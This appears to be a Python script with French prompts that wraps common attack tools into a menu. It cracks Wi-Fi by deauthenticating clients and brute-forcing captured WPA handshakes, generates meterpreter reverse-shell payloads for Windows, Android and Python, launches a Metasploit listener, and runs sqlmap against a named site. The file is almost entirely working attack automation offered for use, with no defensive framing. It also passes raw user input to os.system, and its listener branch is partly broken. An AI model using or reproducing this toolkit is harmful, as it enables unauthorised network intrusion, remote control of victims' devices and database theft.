import os
import time
options = ["1 : crack wifi ", "2 : Creer un payload ",  "3 : lancer un listener", "4 : sqlmap"]
i = 0
while i != 4:
    print(options[i])
    i += 1
choice = str(input("Quel nombre: "))
if choice == "0":
    print("Il faut chosir un nombre entre 1 et 4")
elif choice == "1":

    os.system("iwconfig")
    interface = str(input("Entrer le nom de l'interface wifi : "))
    os.system("sudo airmon-ng start " + interface)
    print("Appuyer sur ctrl C quand vous voyez le bon reseau.")
    time.sleep(2)
    os.system("sudo airodump-ng wlan0mon")
    bssid = input("Entrer le bssid : ")
    channel = input("Entrer le numero de channel : ")
    os.system("mkdir handshake")
    os.system("xterm -e 'airodump-ng -c " + channel + " --bssid " + bssid + " -w outpout wlan0mon' & xterm -e 'aireplay-ng -0 15 -a " + bssid + " wlan0mon' ")
    os.system( "rm outpout*.csv outpout*.netxml")
    os.system("mv outpout*.cap " + bssid)
    os.system("mv " + bssid + " handshake/")
    print("Le handshake a ete capturee, il va etre cracker avec crunch et aircrack-ng")
    minimal = str(input("Entrer la longueur minimal : "))
    maximal = str(input("Entrer la longueur maximal : ")) 
    os.system("crunch " + minimal + " " + maximal + " abcdefghijklmnopqrstuvwxyz0123456789  | aircrack-ng -w - -b " + bssid + " handshake/" + bssid)

elif choice == "2":
    print("1 : windows ")
    print("2 : android ")
    print("3 : python ")
    pay = input("Quel system : ")
    if pay == "1":
        lhost = input("Entre le lhost : ")
        lport = input("Entrer le lport : ")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > dan.exe")
    elif pay == "2":
        lhost = input("Entre le lhost : ")
        lport = input("Entrer le lport : ")
        os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > dan.apk")
    elif pay == "3":
        lhost = input("Entre le lhost : ")
        lport = input("Entrer le lport : ")
        os.system("msfvenom -p python/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > dan.py")


elif choice == "3":
    lhost = input("Entre le lhost : ")
    lport = input("Entrer le lport : ")
    print("1 : windows ")
    print("2 : android ")
    print("3 : python ")
    file = open("msf.txt", "w+")
    file.write("use exploit/multi/handler\n")
    file.write("set lhost " + lhost + "\n")
    file.write("set lport " + lport + "\n")
    pay = input("Quel system : ")
    if pay == "1":
        file.write("set payload windows/meterpreter/reverse_tcp" + "\n")
    elif pay == "2":
        file.write("set payload android/meterpreter/reverse_tcp" + "\n")
    elif pay == "3":
        file.write("set payload python/meterpreter/reverse_tcp" + "\n")
        file.write("run" + "\n")
        file.close()
        os.system("msfconsole -r msf.txt")

elif choice == "4":
    site = input("quel est le nom du site ? : ")
    os.system("sqlmap -u " + site + " --dbs")
else:
    print("erreur veuliiez ressayer")
 

